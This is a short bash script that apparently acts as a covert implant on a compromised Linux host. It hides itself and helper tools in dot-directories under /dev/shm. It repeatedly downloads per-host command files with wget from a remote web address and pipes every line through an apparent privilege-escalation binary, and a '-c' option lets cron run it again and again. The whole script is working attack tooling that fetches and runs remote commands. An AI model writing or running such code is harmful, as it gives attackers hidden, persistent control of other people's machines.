#!/bin/bash

URL="http://omega.uta.edu/~ekg4056/"
#URL=192.168.1.30

PE=lspge
POST=post.sh
DUMP=dump.sh

ADD=`/sbin/ifconfig | grep 'Bcast' | cut -d ':' -f 2 | cut -d ' ' -f 1 | cut -d '.' -f 4`
FILE=file_$ADD
FIRST=first_$FILE

CMNDS=( $FILE $FIRST )

DIR=/dev/shm/.tools/
HIDE=.havoc/

cd $DIR

function download_command_files {
	for file in ${CMNDS[@]}
	do
		# -N only replaces if new -q quiets the output
		echo "wget -O $file $URL$file" | ./$PE
	done
}

function run {
	while read -r line
	do
		echo $line | ./$PE
	done < $1
}

function first_run {
	download_command_files 

	run $FIRST 
}

function running_from_cron {
    
	cd $DIR$HIDE
	download_command_files

	run $FILE
}

function dir_and_tools {
 
if [ ! -d ../$HIDE ]; then
	# if dir doesn't exist
	echo "mkdir ../$HIDE" | ./$PE
fi

# copy over all the tools
if [ ! -f ../$HIDE$PE ]; then
	echo "cp $PE ../$HIDE" | ./$PE
fi

if [ ! -f ../$HIDE$POST ]; then
	echo "cp $POST ../$HIDE" | ./$PE
fi

if [ ! -f ../$HIDE$DUMP ]; then
	echo "cp $DUMP ../$HIDE" | ./$PE
fi

cd ../$HIDE
}

case "$1" in
	-c) running_from_cron
	    ;;
	 *) dir_and_tools
	    first_run
	    ;;
esac

exit 0
